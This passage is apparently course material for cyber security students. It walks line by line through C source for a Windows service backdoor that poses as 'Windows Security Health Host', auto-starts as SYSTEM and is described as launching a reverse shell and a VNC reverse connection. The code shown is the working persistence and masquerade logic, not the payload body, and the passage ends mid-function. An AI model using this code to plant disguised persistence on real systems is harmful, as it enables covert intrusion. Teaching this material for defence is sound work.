# Ghost Service (ghost_svc.c) — Comprehensive Code Documentation

> **Target Audience:** Certificate IV in Cyber Security students
>
> **Purpose:** Line-by-line educational analysis of a Windows Service-based persistence/backdoor mechanism.
>
> **⚠️ Educational Warning:** This code demonstrates malicious techniques for defensive education only. Understanding how attackers operate is fundamental to building effective defences.

---

## 1. Overview of What the Program Does

This C program is a **Windows Service application** that implements a malicious persistent backdoor. It has three operational modes:

1. **Install mode** (`ghost_svc.exe install`): Registers itself as a legitimate-looking Windows service that automatically starts on boot.
2. **Remove mode** (`ghost_svc.exe remove`): Uninstalls the service from the system.
3. **Service mode** (no arguments): Runs as a Windows service under the `SYSTEM` account, executing a post-exploitation payload that launches additional malicious binaries.

The program **masquerades** as a legitimate Windows security component (`SecurityHealthHost`) to blend in with normal system processes and avoid casual detection by administrators or analysts.

### High-Level Attack Chain
```
Installer drops payload files to C:\Windows\Temp\c2\
        |
        v
Service is installed with auto-start, runs as SYSTEM
        |
        v
On every boot, service starts and launches:
   - Reverse shell (spoolsv.exe)
   - VNC server for remote GUI access
   - VNC reverse connection to attacker IP (192.168.1.92)
```

---

## 2. Line-by-Line Breakdown (Organised by Function)

---

### 2.1 Preprocessor Directives and Header Inclusions

```c
#define _CRT_SECURE_NO_WARNINGS
```
| Element | Explanation |
|---------|-------------|
| `#define` | A **preprocessor directive** that creates a macro. The preprocessor runs before compilation and performs text substitution. |
| `_CRT_SECURE_NO_WARNINGS` | A Microsoft-specific macro that **disables security warnings** for "unsafe" C runtime functions like `swprintf()`, `strcpy()`, etc. Microsoft encourages safer versions (`swprintf_s`), but this macro suppresses those warnings. In malware, this is common because attackers prioritise functionality over secure coding practices. |

> **Why it's there:** Without this define, Visual Studio would generate warnings (or errors in strict mode) for using legacy C runtime functions. This keeps compilation clean.

---

```c
#include <windows.h>
```
| Element | Explanation |
|---------|-------------|
| `#include` | Preprocessor directive that copies the contents of the specified header file into this source file before compilation. |
| `<windows.h>` | The **master header file** for the Windows API. It includes declarations for thousands of Windows-specific functions, structures, constants, and macros. This single include gives access to the entire Win32 API: services, processes, files, registry, threads, events, handles, and more. |

> **Why it's there:** This program is entirely dependent on Windows-specific APIs (services, process creation, file operations). It cannot compile or run without this header.

---

```c
#include <stdio.h>
```
| Element | Explanation |
|---------|-------------|
| `<stdio.h>` | The **Standard Input/Output** header from the C standard library. Provides `wprintf()`, `swprintf()`, and other formatted I/O functions. |

> **Why it's there:** Used for printing status messages during installation/removal (`wprintf`) and formatting command lines (`swprintf`).

---

```c
#include <stdlib.h>
```
| Element | Explanation |
|---------|-------------|
| `<stdlib.h>` | The **Standard Library** header. Provides general utilities like `malloc()`, `free()`, `exit()`, `atoi()`, etc. |

> **Why it's there:** Included as standard practice, though this specific program does not explicitly call any `stdlib.h` functions. It's common to include it by default in C programs.

---

```c
#include <string.h>
```
| Element | Explanation |
|---------|-------------|
| `<string.h>` | The **String** header from the C standard library. Provides string manipulation functions like `strcpy()`, `strlen()`, `memcmp()`, etc. |

> **Why it's there:** Included as standard practice. Not explicitly used in this program because the code uses wide-character (`wchar_t`) string functions from `<wchar.h>` (included transitively by `windows.h`) instead.

---

### 2.2 Macro Definitions (Service Configuration)

```c
#define SVCNAME L"SecurityHealthHost"
```
| Element | Explanation |
|---------|-------------|
| `#define` | Creates a text substitution macro. Every occurrence of `SVCNAME` in the code is replaced with `L"SecurityHealthHost"` before compilation. |
| `SVCNAME` | The **internal service name** (registry key name) used by Windows to identify this service. |
| `L` prefix | The **wide-character string literal prefix**. It tells the compiler to produce a string of `wchar_t` (16-bit UTF-16 on Windows) instead of 8-bit `char`. |
| `"SecurityHealthHost"` | The chosen name **masquerades** as the legitimate Windows Security Health Service. An administrator viewing services would see a name that looks authentic and trustworthy. |

> **Why it's there:** Using a legitimate-sounding name is a **social engineering** technique. It reduces suspicion if an administrator lists running services. The internal name is what the SCM (Service Control Manager) uses in the registry and command-line tools like `sc query`.

---

```c
#define SVCDISP L"Windows Security Health Host"
```
| Element | Explanation |
|---------|-------------|
| `SVCDISP` | The **display name** of the service. This is the human-readable name shown in the Services management console (`services.msc`). |
| `"Windows Security Health Host"` | Again, mimics legitimate Windows security infrastructure. The display name often includes "Windows" to appear as an official Microsoft component. |

> **Why it's there:** The display name is what most administrators see first. A convincing display name is critical for blending in with the ~200+ legitimate Windows services.

---

```c
#define SVCDESC L"Provides security health monitoring and reporting for Windows."
```
| Element | Explanation |
|---------|-------------|
| `SVCDESC` | The **service description** shown when viewing service properties in `services.msc` or via `sc qdescription`. |
| `"Provides security health monitoring and reporting for Windows."` | Continues the masquerade with plausible, professional-sounding language that mirrors Microsoft's technical writing style. |

> **Why it's there:** A description adds legitimacy. Services without descriptions are more suspicious to trained analysts. This description makes the service appear professionally developed and essential to system security.

---

```c
#define STAGING_DIR L"C:\\Windows\\Temp\\c2\\"
```
| Element | Explanation |
|---------|-------------|
| `STAGING_DIR` | A macro defining the **staging directory** where payload files are stored. |
| `C:\Windows\Temp\c2\` | `C:\Windows\Temp` is a world-writable temporary directory that persists across reboots (unlike user temp). The `c2` subdirectory is short for **Command and Control** — the attacker's infrastructure. The double backslashes (`\\`) are necessary because `\` is the C escape character; `\\` becomes a single `\` in the compiled string. |

> **Why it's there:** This is the operational base for the malware. Using `C:\Windows\Temp` is stealthy because:
> - It's a legitimate Windows directory
> - It doesn't require administrative rights for some operations (though writing here typically does)
> - It's not routinely monitored by users
> - Files here are less suspicious than files in user directories

---

### 2.3 Global Variables

```c
SERVICE_STATUS gSvcStatus;
```
| Element | Explanation |
|---------|-------------|
| `SERVICE_STATUS` | A Windows structure defined in `windows.h` that holds the current state of a service. Contains fields like `dwCurrentState`, `dwControlsAccepted`, `dwWin32ExitCode`, `dwCheckPoint`, and `dwWaitHint`. |
| `gSvcStatus` | A **global variable** (the `g` prefix is a common Hungarian notation convention for "global") that stores the service's current status. The SCM requires services to report their status periodically. |

> **Why it's there:** The service must maintain and update its status so the SCM knows whether it's starting, running, stopping, or stopped. Without this, Windows would assume the service failed to start.

---

```c
SERVICE_STATUS_HANDLE gSvcStatusHandle;
```
| Element | Explanation |
|---------|-------------|
| `SERVICE_STATUS_HANDLE` | A Windows typedef for a handle returned by `RegisterServiceCtrlHandlerW()`. This handle is used to communicate status updates to the SCM. |
| `gSvcStatusHandle` | Global variable storing the handle used when calling `SetServiceStatus()`. |

> **Why it's there:** Every service needs this handle to report status changes. It's the "phone line" back to the SCM.

---

```c
HANDLE ghSvcStopEvent = NULL;
```
| Element | Explanation |
|---------|-------------|
| `HANDLE` | A Windows typedef for a generic handle — an opaque reference to a kernel object (file, process, thread, event, etc.). |
| `ghSvcStopEvent` | Global variable for a **manual-reset event object** (`h` = handle, `SvcStop` = service stop). Events are kernel synchronisation primitives. |
| `= NULL` | Initialises the handle to `NULL`. If `CreateEvent` fails, the variable will still have a known value. |

> **Why it's there:** This event is the "signal" that tells the service to shut down cleanly. The control handler sets this event when Windows requests a stop, and the main service thread waits on it. This is the standard pattern for service shutdown synchronisation.

---

### 2.4 Function Prototypes (Forward Declarations)

```c
void WINAPI SvcCtrlHandler(DWORD dwCtrl);
```
| Element | Explanation |
|---------|-------------|
| `void` | Return type — this function returns nothing. |
| `WINAPI` | A Windows calling convention macro that expands to `__stdcall`. This specifies how function arguments are passed (on the stack) and who cleans them up (the callee). All Windows API callbacks must use `WINAPI`. |
| `SvcCtrlHandler` | The **Service Control Handler** function. This is called by Windows (not by our code) when the SCM needs to send a control signal (stop, pause, interrogate, etc.). |
| `DWORD dwCtrl` | The control code being sent (e.g., `SERVICE_CONTROL_STOP`, `SERVICE_CONTROL_INTERROGATE`). `DWORD` is a 32-bit unsigned integer (Double WORD). |

> **Why it's there:** Forward declaration so the compiler knows the function signature before it's defined. Also required because `RegisterServiceCtrlHandlerW` needs a pointer to this function.

---

```c
void WINAPI SvcMain(DWORD argc, LPWSTR *argv);
```
| Element | Explanation |
|---------|-------------|
| `SvcMain` | The **Service Main** function — the entry point for the service when started by the SCM. Analogous to `main()` for a regular program, but for services. |
| `DWORD argc` | Argument count, same concept as standard C `argc`. |
| `LPWSTR *argv` | Argument vector. `LPWSTR` is a **Long Pointer to Wide String** — a `wchar_t*`. The `*` makes it an array of wide strings. |

> **Why it's there:** Forward declaration. `StartServiceCtrlDispatcherW` needs a function pointer to this. This is the function Windows calls when the service starts.

---

```c
void ReportSvcStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint);
```
| Element | Explanation |
|---------|-------------|
| `ReportSvcStatus` | A helper function that updates the service status structure and reports it to the SCM. |
| `dwCurrentState` | The new state (e.g., `SERVICE_START_PENDING`, `SERVICE_RUNNING`). |
| `dwWin32ExitCode` | Error code, or `NO_ERROR` on success. |
| `dwWaitHint` | Milliseconds the SCM should wait before expecting another status update. |

> **Why it's there:** Abstracts the repetitive task of filling out the `SERVICE_STATUS` structure and calling `SetServiceStatus`. This is called multiple times during the service lifecycle.

---

```c
void DoPayload(void);
```
| Element | Explanation |
|---------|-------------|
| `DoPayload` | The function that executes the malicious actions after the service is running. |
| `(void)` | Explicitly states this function takes no parameters. In C, `()` means unspecified parameters; `(void)` means no parameters. |

> **Why it's there:** Forward declaration. This is the "evil" function that launches the backdoor processes.

---

```c
BOOL LaunchProcessAsSystem(LPCWSTR exePath, LPCWSTR args);
```
| Element | Explanation |
|---------|-------------|
| `BOOL` | Windows typedef for a Boolean: `TRUE` (non-zero) or `FALSE` (0). |
| `LaunchProcessAsSystem` | Helper function to launch a child process with the service's `SYSTEM` privileges. |
| `LPCWSTR` | **Long Pointer to Constant Wide String** — a `const wchar_t*`. The `C` means the string won't be modified. |
| `exePath` | Full path to the executable to launch. |
| `args` | Optional command-line arguments. |

> **Why it's there:** Abstracts process creation. Since the service runs as `SYSTEM`, any process it creates also runs as `SYSTEM` (by default inheritance). This is how the attacker elevates their payloads to the highest privilege level.

---

### 2.5 `wmain()` — Program Entry Point

```c
int wmain(int argc, wchar_t *argv[])
```
| Element | Explanation |
|---------|-------------|
| `int` | Return type. Returning `0` typically means success; non-zero means failure. |
| `wmain` | The **wide-character version** of `main()`. Unlike standard `main()` which receives `char* argv[]`, `wmain()` receives `wchar_t* argv[]` (Unicode/UTF-16 on Windows). |
| `argc` | **Argument Count**: number of command-line arguments passed to the program. The program name itself counts as the first argument, so `argc` is always at least 1. |
| `wchar_t *argv[]` | **Argument Vector**: array of wide-character strings. `argv[0]` is the program path, `argv[1]` is the first user-supplied argument, etc. |

> **Why `wmain` instead of `main`?** Windows uses UTF-16 internally. Using `wmain` allows the program to handle Unicode paths and service names correctly. If you use `main`, Windows converts arguments to the system's ANSI code page, which can corrupt international characters. Since this program uses wide-string APIs exclusively (`CreateServiceW`, `StartServiceCtrlDispatcherW`, etc.), `wmain` is the correct choice.

---

```c
    SERVICE_TABLE_ENTRYW DispatchTable[] = {
        { SVCNAME, (LPSERVICE_MAIN_FUNCTIONW)SvcMain },
        { NULL, NULL }
    };
```
| Element | Explanation |
|---------|-------------|
| `SERVICE_TABLE_ENTRYW` | A Windows structure that maps a service name to its entry point function. The `W` suffix indicates the wide-character (Unicode) version. |
| `DispatchTable[]` | An **array of structures**. This array tells the SCM which services this executable provides. A single `.exe` can host multiple services. |
| `{ SVCNAME, (LPSERVICE_MAIN_FUNCTIONW)SvcMain }` | First array element: associates the service name `SecurityHealthHost` with the `SvcMain` function. The cast `(LPSERVICE_MAIN_FUNCTIONW)` is required because C is strict about function pointer types. `LPSERVICE_MAIN_FUNCTIONW` is defined as `void (WINAPI *)(DWORD, LPWSTR*)`. |
| `{ NULL, NULL }` | **Sentinel/terminator entry**. The array must end with a null entry so `StartServiceCtrlDispatcherW` knows where the list ends. This is a common C pattern for variable-length arrays. |

> **Why it's there:** This table is the "menu" that `StartServiceCtrlDispatcherW` uses. When the SCM starts this service, it looks up the service name in this table and calls the corresponding function. Without this dispatch table, the program cannot function as a service.

---

#### 2.5.1 Install Mode

```c
    if (argc > 1 && _wcsicmp(argv[1], L"install") == 0) {
```
| Element | Explanation |
|---------|-------------|
| `argc > 1` | Checks if at least one argument was provided beyond the program name. |
| `_wcsicmp()` | **Wide-Character String Case-Insensitive Compare**. Compares two `wchar_t` strings without regard to case (`install`, `INSTALL`, `Install` all match). The `wc` stands for wide character, `s` for string, `icmp` for case-insensitive compare. |
| `argv[1]` | The first user argument. |
| `L"install"` | The literal wide string to compare against. |
| `== 0` | In C, string comparison functions return `0` when strings are **equal**. (They return the difference between the first mismatched characters otherwise.) |

> **Why it's there:** This branch handles the installation of the service. The attacker runs `ghost_svc.exe install` once to register the service in Windows.

---

```c
        SC_HANDLE scManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
```
| Element | Explanation |
|---------|-------------|
| `SC_HANDLE` | A handle to the Service Control Manager database. |
| `OpenSCManagerW()` | Opens a connection to the **Service Control Manager (SCM)** — the Windows component that manages all services. The `W` suffix indicates the Unicode version. |
| First `NULL` | Machine name (`NULL` = local machine). |
| Second `NULL` | Database name (`NULL` = default active database). |
| `SC_MANAGER_CREATE_SERVICE` | The requested access right. This specific right allows the caller to create a new service. Other rights include `SC_MANAGER_CONNECT`, `SC_MANAGER_ENUMERATE_SERVICE`, etc. |

> **Why it's there:** Before you can create a service, you must establish a connection to the SCM with the appropriate access rights. This is the "key" that unlocks service management.

---

```c
        if (!scManager) {
            wprintf(L"[-] OpenSCManager failed: %lu\n", GetLastError());
            return 1;
        }
```
| Element | Explanation |
|---------|-------------|
| `if (!scManager)` | Tests if the handle is `NULL` (0). Windows API functions return `NULL` on failure. The `!` operator inverts the truthiness: if `scManager` is NULL, the condition is true. |
| `wprintf()` | Wide-character version of `printf()`. Prints formatted output to stdout using wide strings. |
| `L"[-] OpenSCManager failed: %lu\n"` | Format string. `[-]` is a common red-team convention indicating failure. `%lu` is the format specifier for an unsigned long (`DWORD`). `\n` is a newline. |
| `GetLastError()` | A crucial Windows function that returns the error code set by the last failed API call. Each thread has its own last-error code. |
| `return 1;` | Exits the program with a non-zero status, indicating failure to the calling process (batch file, command prompt, etc.). |

> **Why it's there:** Error handling is critical in malware too — if installation fails, the attacker needs to know why. The `[-]` prefix is attacker-friendly output formatting borrowed from penetration testing tools.

---

```c
        wchar_t path[MAX_PATH];
```
| Element | Explanation |
|---------|-------------|
| `wchar_t` | Wide character type (16-bit on Windows). |
| `path[MAX_PATH]` | Array of 260 wide characters. `MAX_PATH` is a Windows constant equal to `260` — the traditional maximum path length in Windows. |

> **Why it's there:** Buffer to store the full path of the currently running executable. Needed because `CreateServiceW` requires the path to the service executable.

---

```c
        GetModuleFileNameW(NULL, path, MAX_PATH);
```
| Element | Explanation |
|---------|-------------|
| `GetModuleFileNameW()` | Retrieves the full path of the specified module (executable or DLL). The `W` suffix = wide/Unicode version. |
| `NULL` | When `NULL` is passed as the module handle, it means "the currently executing program" (the `.exe` file that loaded this code). |
| `path` | The output buffer where the path string will be written. |
| `MAX_PATH` | The size of the buffer in characters (not bytes). Prevents buffer overflow by telling the function the maximum it can write. |

> **Why it's there:** The service registration needs to know where the executable file lives so Windows can run it on boot. Using `GetModuleFileNameW(NULL, ...)` makes the program self-locating — it works regardless of where the attacker dropped the file.

---

```c
        SC_HANDLE scService = CreateServiceW(
            scManager,
            SVCNAME,
            SVCDISP,
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            path,
            NULL, NULL, NULL, NULL, NULL
        );
```
| Parameter | Explanation |
|-----------|-------------|
| `scManager` | Handle to the SCM (from `OpenSCManagerW`). |
| `SVCNAME` | Internal service name: `"SecurityHealthHost"`. This becomes the registry key name under `HKLM\SYSTEM\CurrentControlSet\Services\`. |
| `SVCDISP` | Display name shown in `services.msc`. |
| `SERVICE_ALL_ACCESS` | Grants all possible access rights to the returned service handle. The installer wants full control. |
| `SERVICE_WIN32_OWN_PROCESS` | Service type: this service runs in its **own process**, not shared with other services. This gives the attacker isolation and their own memory space. |
| `SERVICE_AUTO_START` | **Start type**: automatically starts when the system boots. This is the persistence mechanism. Other options: `SERVICE_DEMAND_START` (manual), `SERVICE_DISABLED`. |
| `SERVICE_ERROR_NORMAL` | Error control: if the service fails to start, the SCM logs an error but continues booting. Other options include `SERVICE_ERROR_CRITICAL` (system reboots on failure). |
| `path` | Full path to this executable — the command the SCM runs to start the service. |
| `NULL, NULL, NULL, NULL, NULL` | Remaining optional parameters: load order group, tag ID, dependencies, service start account name, and password. All `NULL` means: no group, no dependencies, and **run as `LocalSystem`** (the default when no account is specified). |

> **Why it's there:** This is the **core persistence mechanism**. `CreateServiceW` writes the service configuration to the Windows Registry. Once created, Windows will automatically run this executable as `SYSTEM` on every boot — even before user login. The `LocalSystem` account is the most powerful account on Windows, with virtually unlimited privileges.

---

```c
        if (!scService) {
            wprintf(L"[-] CreateService failed: %lu\n", GetLastError());
            CloseServiceHandle(scManager);
            return 1;
        }
```
| Element | Explanation |
|---------|-------------|
| `if (!scService)` | Checks if service creation failed (returned `NULL`). |
| `CloseServiceHandle(scManager)` | **Closes the SCM handle**. Windows handles are finite kernel resources; failing to close them causes resource leaks. Always close handles when done. |
| `return 1;` | Exit with error code. |

> **Why it's there:** Proper error handling and resource cleanup. Even malware should avoid leaking handles that might arouse suspicion or exhaust resources.

---

```c
        SERVICE_DESCRIPTIONW sd = { (LPWSTR)SVCDESC };
```
| Element | Explanation |
|---------|-------------|
| `SERVICE_DESCRIPTIONW` | A Windows structure containing a single field: `LPWSTR lpDescription`. |
| `sd` | Variable name for the structure instance. |
| `{ (LPWSTR)SVCDESC }` | Initialises the structure with the description string. The cast `(LPWSTR)` is technically unnecessary here (the macro already expands to a wide string literal), but ensures the compiler doesn't complain about `const` qualifiers. |

> **Why it's there:** Services created with `CreateServiceW` don't have descriptions by default. Adding a description makes the service look more professionally developed and less suspicious.

---

```c
        ChangeServiceConfig2W(scService, SERVICE_CONFIG_DESCRIPTION, &sd);
```
| Element | Explanation |
|---------|-------------|
| `ChangeServiceConfig2W()` | A Windows API function that modifies optional service configuration parameters. The `2` indicates it's the extended version that handles newer configuration options like description, failure actions, and delayed auto-start. |
| `scService` | Handle to the service to modify. |
| `SERVICE_CONFIG_DESCRIPTION` | Information level code: tells the function we're changing the description field. |
| `&sd` | Pointer to the `SERVICE_DESCRIPTIONW` structure. |

> **Why it's there:** Adds the human-readable description to the service. This is a separate API call because `CreateServiceW` predates the description field; descriptions were added in later Windows versions.

---

```c
        wprintf(L"[+] Service '%ls' installed successfully.\n", SVCDISP);
```
| Element | Explanation |
|---------|-------------|
| `[+]` | Red-team convention indicating success (opposite of `[-]`). |
| `%ls` | Format specifier for a wide string (`wchar_t*`). |
| `SVCDISP` | The display name macro is substituted here. |

> **Why it's there:** Provides attacker feedback that installation succeeded.

---

```c
        wprintf(L"[+] Run: net start SecurityHealthHost\n");
```
| Element | Explanation |
|---------|-------------|
| `net start SecurityHealthHost` | The Windows command to manually start a service. |

> **Why it's there:** Helpful instruction for the attacker to immediately start the service without waiting for a reboot.

---

```c
        CloseServiceHandle(scService);
        CloseServiceHandle(scManager);
        return 0;
```
| Element | Explanation |
|---------|-------------|
| `CloseServiceHandle(scService)` | Closes the service handle. |
| `CloseServiceHandle(scManager)` | Closes the SCM handle. |
| `return 0;` | Success exit code. |

> **Why it's there:** Clean resource management. Both handles must be closed to release kernel resources.

---

#### 2.5.2 Remove Mode

```c
    if (argc > 1 && _wcsicmp(argv[1], L"remove") == 0) {
```
| Element | Explanation |
|---------|-------------|
| Same pattern as install check, but compares against `"remove"`. |

> **Why it's there:** Allows the attacker (or a cleanup script) to uninstall the service, removing the registry entries and persistence.

---

```c
        SC_HANDLE scManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
```
| Element | Explanation |
|---------|-------------|
| `SC_MANAGER_CONNECT` | Only requires permission to connect to the SCM, not create services. Lower privilege requirement than install mode. |

> **Why it's there:** Removal needs less privilege than creation. An administrator only needs connect and delete rights on the specific service.

---

```c
        SC_HANDLE scService = OpenServiceW(scManager, SVCNAME, DELETE);
```
| Element | Explanation |
|---------|-------------|
| `OpenServiceW()` | Opens an existing service by name and returns a handle. |
| `DELETE` | The requested access right — only the right to delete this service. Principle of least privilege. |

> **Why it's there:** Before you can delete a service, you must obtain a handle to it with delete access.

---

```c
        if (scService) {
            DeleteService(scService);
            wprintf(L"[+] Service removed.\n");
            CloseServiceHandle(scService);
        }
```
| Element | Explanation |
|---------|-------------|
| `DeleteService()` | Removes the service from the SCM database (deletes the registry key). The service must be stopped first. |
| `CloseServiceHandle(scService)` | Closes the service handle. |

> **Why it's there:** `DeleteService` is the SCM API for uninstalling a service. Note that this only removes the registry configuration; the executable file on disk is NOT deleted.

---

```c
        CloseServiceHandle(scManager);
        return 0;
```
| Element | Explanation |
|---------|-------------|
| Closes SCM handle and exits successfully. |

> **Why it's there:** Cleanup and exit.

---

#### 2.5.3 Service Mode (Default)

```c
    if (!StartServiceCtrlDispatcherW(DispatchTable)) {
        wprintf(L"[-] StartServiceCtrlDispatcher failed: %lu\n", GetLastError());
        return 1;
    }
    return 0;
```
| Element | Explanation |
|---------|-------------|
| `StartServiceCtrlDispatcherW()` | The **critical function** that connects the program to the SCM and begins service execution. This function **does not return** until all services in the dispatch table have stopped. It registers the service entry points with the SCM, which then calls `SvcMain` in a new thread. |
| `!` (negation) | If the function returns 0 (failure), the error block executes. |
| `GetLastError()` | Retrieves the specific failure reason. Common failure: running the `.exe` directly from the command line instead of via the SCM. |

> **Why it's there:** This is the "bridge" between a normal program and a Windows service. Without this call, the program is just a regular console application. When the SCM starts a service executable, it expects this function to be called immediately. If you run the `.exe` directly (double-click), this function fails because there's no SCM connection.

> **Critical concept:** `StartServiceCtrlDispatcherW` blocks the main thread. The SCM spawns a new thread to run `SvcMain`. This is why services can continue running while the dispatcher waits.

---

### 2.6 `SvcMain()` — Service Main Entry Point

```c
void WINAPI SvcMain(DWORD argc, LPWSTR *argv)
```
| Element | Explanation |
|---------|-------------|
| Called by the SCM (via `StartServiceCtrlDispatcherW`) when the service is started. This runs in a thread created by the SCM. |

---

```c
    UNREFERENCED_PARAMETER(argc);
    UNREFERENCED_PARAMETER(argv);
```
| Element | Explanation |
|---------|-------------|
| `UNREFERENCED_PARAMETER` | A Windows macro that casts the parameter to itself, silencing compiler warnings about unused parameters. |

> **Why it's there:** `SvcMain` must accept these parameters to match the expected signature, but this service doesn't use command-line arguments. This macro is cleaner than `(void)argc;` or leaving them unreferenced (which triggers warnings in strict compilation).

---

```c
    gSvcStatusHandle = RegisterServiceCtrlHandlerW(SVCNAME, SvcCtrlHandler);
```
| Element | Explanation |
|---------|-------------|
| `RegisterServiceCtrlHandlerW()` | Registers the service control handler function with the SCM. This tells Windows: "when you need to send control signals (like STOP) to this service, call `SvcCtrlHandler`." |
| Returns a `SERVICE_STATUS_HANDLE` used for subsequent status reporting. |

> **Why it's there:** A service MUST register a control handler within a short time window (typically ~30 seconds) after `SvcMain` starts, or the SCM assumes the service is hung and terminates it. This is one of the first things every service must do.

---

```c
    if (!gSvcStatusHandle) return;
```
| Element | Explanation |
|---------|-------------|
| If registration failed, exit the service immediately. Without a status handle, the service cannot communicate with the SCM. |

---

```c
    gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
```
| Element | Explanation |
|---------|-------------|
| `dwServiceType` | Field of `SERVICE_STATUS` indicating what kind of service this is. |
| `SERVICE_WIN32_OWN_PROCESS` | This service runs in its own process, not shared with other services. Must match the type specified in `CreateServiceW`. |

---

```c
    gSvcStatus.dwServiceSpecificExitCode = 0;
```
| Element | Explanation |
|---------|-------------|
| `dwServiceSpecificExitCode` | For service-specific error codes (used when `dwWin32ExitCode` is `ERROR_SERVICE_SPECIFIC_ERROR`). Set to 0 because we're not using service-specific codes. |

---

```c
    ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000);
```
| Element | Explanation |
|---------|-------------|
| `SERVICE_START_PENDING` | Tells the SCM: "I'm starting up, not fully running yet." |
| `NO_ERROR` | No errors so far. |
| `3000` | Wait hint: tells the SCM "check back in 3000 milliseconds (3 seconds) for another update." |

> **Why it's there:** The SCM monitors service startup. If a service doesn't report `SERVICE_RUNNING` within a reasonable time, Windows assumes it failed. Reporting `SERVICE_START_PENDING` buys time.

---

```c
    ghSvcStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
```
| Element | Explanation |
|---------|-------------|
| `CreateEvent()` | Creates a kernel **event object** — a synchronisation primitive used for signalling between threads. |
| First `NULL` | Default security descriptor (no special security). |
| `TRUE` | **Manual-reset** event. When signalled, it stays signalled until explicitly reset. (Contrast with `FALSE` = auto-reset, which resets after one waiting thread is released.) |
| `FALSE` | Initial state: **non-signalled** (the event starts "clear"). |
| Last `NULL` | No name — anonymous event, not shared with other processes. |

> **Why it's there:** This event is the shutdown signal. The control handler will `SetEvent()` this when Windows requests a stop, and `SvcMain` will be waiting on it.

---

```c
    if (!ghSvcStopEvent) {
        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
        return;
    }
```
| Element | Explanation |
|---------|-------------|
| If event creation fails, report stopped status with the error code and exit. |

---

```c
    ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);
```
| Element | Explanation |
|---------|-------------|
| `SERVICE_RUNNING` | Tells the SCM the service is now fully operational. |
| `0` wait hint | Not applicable when running. |

> **Why it's there:** Once this is reported, Windows considers the service successfully started. The service now appears as "Running" in `services.msc`.

---

```c
    // === SERVICE IS NOW RUNNING AS SYSTEM ===
    DoPayload();
```
| Element | Explanation |
|---------|-------------|
| Comment explicitly notes the privilege level: `SYSTEM`. |
| `DoPayload()` | Calls the malicious payload function. |

> **Why it's there:** This is the moment of exploitation. The service is now running with `SYSTEM` privileges — the highest privilege level on Windows, more powerful than any Administrator account.

---

```c
    WaitForSingleObject(ghSvcStopEvent, INFINITE);
```
| Element | Explanation |
|---------|-------------|
| `WaitForSingleObject()` | Blocks the calling thread until the specified object (our event) is signalled, or the timeout expires. |
| `ghSvcStopEvent` | The event to wait on. |
| `INFINITE` | Wait forever — do not time out. The thread will sleep here consuming negligible CPU until the stop event is signalled. |

> **Why it's there:** This keeps the service "alive." Without this wait, `SvcMain` would return, the thread would exit, and the SCM would think the service crashed. The service must remain in a running state until explicitly told to stop.

---

```c
    ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
```
| Element | Explanation |
|---------|-------------|
| After the event is signalled (service stop requested), reports `SERVICE_STOPPED` to the SCM. |

---

### 2.7 `SvcCtrlHandler()` — Service Control Handler

```c
void WINAPI SvcCtrlHandler(DWORD dwCtrl)
```
| Element | Explanation |
|---------|-------------|
| Called by Windows (SCM) on a **different thread** when a control request is sent to this service. This function must return quickly; never perform long operations here. |

---

```c
    switch (dwCtrl) {
```
| Element | Explanation |
|---------|-------------|
| A `switch` statement evaluates the control code and executes the matching case. |

---

```c
    case SERVICE_CONTROL_STOP:
```
| Element | Explanation |
|---------|-------------|
| `SERVICE_CONTROL_STOP` | The control code sent by Windows when someone requests the service to stop (via `services.msc`, `net stop`, `sc stop`, or system shutdown). |

---

```c
        ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
```
| Element | Explanation |
|---------|-------------|
| Reports that the service is in the process of stopping. This acknowledges the stop request to the SCM. |

---

```c
        SetEvent(ghSvcStopEvent);
```
| Element | Explanation |
|---------|-------------|
| `SetEvent()` | Signals the event object, changing its state from non-signalled to signalled. |

> **Why it's there:** This wakes up the `WaitForSingleObject` in `SvcMain`, allowing the service thread to exit cleanly and report `SERVICE_STOPPED`.

---

```c
        ReportSvcStatus(gSvcStatus.dwCurrentState, NO_ERROR, 0);
```
| Element | Explanation |
|---------|-------------|
| Reports the current state. At this point it should reflect the stopped/pending state. |

---

```c
        return;
```
| Element | Explanation |
|---------|-------------|
| Exits the control handler function. |

---

```c
    case SERVICE_CONTROL_INTERROGATE:
        break;
```
| Element | Explanation |
|---------|-------------|
| `SERVICE_CONTROL_INTERROGATE` | A control code sent by the SCM to check if the service is still responsive. The SCM may send this if it hasn't heard from the service recently. |
| `break;` | Does nothing special — just falls through. Windows considers the service alive simply because the handler responded. |

> **Why it's there:** While not strictly necessary (the default case would handle it), explicitly listing `INTERROGATE` shows awareness of the full service control protocol. Some services refresh their status here.

---

```c
    default:
        break;
```
| Element | Explanation |
|---------|-------------|
| `default` | Catches any unrecognised control codes. |
| `break;` | Does nothing. |

> **Why it's there:** Defensive programming. Future Windows versions might add new control codes; ignoring unknown codes is safer than crashing.

---

### 2.8 `ReportSvcStatus()` — Status Reporting Helper

```c
void ReportSvcStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint)
```
| Element | Explanation |
|---------|-------------|
| A helper function that encapsulates the logic of updating `gSvcStatus` and calling `SetServiceStatus`. |

---

```c
    static DWORD dwCheckPoint = 1;
```
| Element | Explanation |
|---------|-------------|
| `static` | A storage class specifier. `static` inside a function means the variable retains its value between function calls (persistent storage), but is only visible within this function. |
| `dwCheckPoint` | A counter used during pending states. The SCM uses checkpoints to track service startup/shutdown progress. Each call increments it, showing the SCM that the service is making progress and not hung. |
| `= 1` | Initialised to 1 on the first call. |

> **Why it's there:** During `SERVICE_START_PENDING` or `SERVICE_STOP_PENDING`, the SCM expects the checkpoint to increase periodically. A static counter ensures each call reports a higher number.

---

```c
    gSvcStatus.dwCurrentState = dwCurrentState;
    gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
    gSvcStatus.dwWaitHint = dwWaitHint;
```
| Element | Explanation |
|---------|-------------|
| Updates the global status structure with the parameters passed in. |

---

```c
